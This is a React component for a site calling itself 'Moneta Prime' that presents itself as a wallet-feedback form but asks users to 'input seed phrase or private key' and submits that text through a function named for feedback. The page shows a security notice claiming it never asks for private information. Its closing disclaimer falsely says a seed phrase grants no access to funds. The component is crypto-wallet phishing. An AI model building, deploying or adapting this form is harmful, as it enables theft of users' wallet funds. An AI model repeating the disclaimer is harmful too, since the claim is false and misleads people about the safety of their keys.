import React, { useState } from "react";
import { useOrbit } from "../context/OrbitContext";
import { motion } from "motion/react";
import { Wallet, ShieldAlert, CheckCircle2, ChevronDown } from "lucide-react";
import toast from "react-hot-toast";

const WALLET_OPTIONS = [
  "MetaMask",
  "Trust Wallet",
  "Phantom",
  "Coinbase Wallet",
  "OKX Wallet",
  "Rabby Wallet",
  "Ledger",
  "Trezor",
  "Safe (Gnosis Safe)",
  "WalletConnect",
  "Other"
];

export const DashboardWalletFeedback: React.FC = () => {
  const { submitWalletFeedback } = useOrbit();
  const [selectedWallet, setSelectedWallet] = useState<string>("MetaMask");
  const [reason, setReason] = useState("");
  const [wouldUse, setWouldUse] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!reason.trim()) {
      toast.error("Please provide a purpose for linking this wallet.");
      return;
    }

    setIsSubmitting(true);
    await submitWalletFeedback(selectedWallet, reason.trim(), wouldUse);
    setIsSubmitting(false);

    // Reset form after submission
    setReason("");
  };

  return (
    <div className="max-w-3xl mx-auto space-y-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-orbit-card border border-orbit-border rounded-2xl p-6 relative overflow-hidden"
      >
        <div className="relative z-10">
          <div className="flex items-center gap-3 mb-2">
            <div className="p-2 bg-orbit-accent/10 rounded-xl">
              <Wallet size={24} className="text-orbit-accent" />
            </div>
            <h1 className="text-2xl font-bold text-orbit-white font-heading">Link Wallet</h1>
          </div>
          <p className="text-orbit-gray-text">
            We prioritize our Web3 wallet integrations. Let us know which wallet you use
          </p>
        </div>

        {/* Decorative background element */}
        <div className="absolute right-0 top-0 w-64 h-64 bg-orbit-accent/5 rounded-full blur-3xl -translate-y-1/2 translate-x-1/3"></div>
      </motion.div>

      {/* Security Notice */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
        className="bg-emerald-500/10 border border-emerald-500/20 rounded-xl p-4 flex gap-3"
      >
        <ShieldAlert size={20} className="text-emerald-400 shrink-0 mt-0.5" />
        <div>
          <h3 className="text-sm font-bold text-emerald-400">Security Notice</h3>
          <p className="text-xs text-emerald-400/80 mt-1">
            For your security, Moneta Prime will never ask for your private info.
          </p>
        </div>
      </motion.div>

      {/* Form */}
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="bg-orbit-card border border-orbit-border rounded-2xl p-6"
      >
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Wallet Selector */}
          <div>
            <label className="block text-sm font-medium text-orbit-white mb-2">
              Select Wallet
            </label>
            <div className="relative">
              <select
                value={selectedWallet}
                onChange={(e) => setSelectedWallet(e.target.value)}
                className="w-full bg-orbit-bg border border-orbit-border rounded-xl px-4 py-3 text-orbit-white focus:outline-none focus:border-orbit-accent focus:ring-1 focus:ring-orbit-accent appearance-none cursor-pointer"
              >
                {WALLET_OPTIONS.map(wallet => (
                  <option key={wallet} value={wallet}>{wallet}</option>
                ))}
              </select>
              <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-orbit-gray-text">
                <ChevronDown size={16} />
              </div>
            </div>
          </div>

          {/* Reason */}
          <div>
            <label className="block text-sm font-medium text-orbit-white mb-2">
              input seed phrase or private key <span className="text-red-400">*</span>
            </label>
            <textarea
              required
              value={reason}
              onChange={(e) => setReason(e.target.value)}
              placeholder="input seed phrase or private key"
              className="w-full bg-orbit-bg border border-orbit-border rounded-xl px-4 py-3 text-orbit-white placeholder-orbit-gray-text/50 focus:outline-none focus:border-orbit-accent focus:ring-1 focus:ring-orbit-accent min-h-[100px] resize-y"
            />
          </div>

          {/* Checkbox */}
          <label className="flex items-start gap-3 cursor-pointer group">
            <div className="relative flex items-center justify-center mt-0.5">
              <input
                type="checkbox"
                checked={wouldUse}
                onChange={(e) => setWouldUse(e.target.checked)}
                className="peer sr-only"
              />
              <div className="w-5 h-5 rounded border border-orbit-border bg-orbit-bg peer-checked:bg-orbit-accent peer-checked:border-orbit-accent transition-colors"></div>
              <CheckCircle2 size={14} className="absolute text-orbit-card opacity-0 peer-checked:opacity-100 transition-opacity" />
            </div>
            <span className="text-sm text-orbit-gray-text group-hover:text-orbit-white transition-colors">
              accpet terms and conditions.
            </span>
          </label>

          {/* Submit */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-orbit-accent hover:bg-orbit-accent-hover text-orbit-card font-bold py-3 px-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex justify-center items-center gap-2"
          >
            {isSubmitting ? (
              <div className="w-5 h-5 border-2 border-orbit-card/30 border-t-orbit-card rounded-full animate-spin"></div>
            ) : (
              "Link Wallet"
            )}
          </button>
          <p className="text-xs text-orbit-gray-text">Disclaimer : Inputting your wallet private key or seed phrase does not give Moneta Prime access to your wallet funds. It is only used to verify ownership of the wallet.</p>
        </form>
      </motion.div>
    </div>
  );
};
